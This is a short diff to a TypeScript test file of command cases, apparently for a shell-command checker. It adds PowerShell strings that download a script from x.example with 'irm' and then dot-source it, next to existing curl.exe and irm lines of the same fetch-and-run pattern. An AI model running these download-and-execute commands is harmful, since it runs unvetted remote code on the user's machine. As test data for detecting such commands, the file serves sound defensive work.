@@ -2759,6 +2759,8 @@ export function behavioralContractCases(paths: {
     ...[
       '. $p',
       '. (Join-Path $PSScriptRoot reset.ps1)',
+      '. ~/scripts/reset.ps1',
+      String.raw`irm https://x.example/r.ps1 -OutFile .\scripts\reset.ps1; . .\scripts\reset.ps1`,
       'irm https://x.example/r.ps1 -OutFile scripts/reset.ps1; . ./scripts/reset.ps1',
       'curl.exe -o scripts/reset.ps1 https://x.example/r.ps1; & ./scripts/reset.ps1',
     ].map((command) => ({
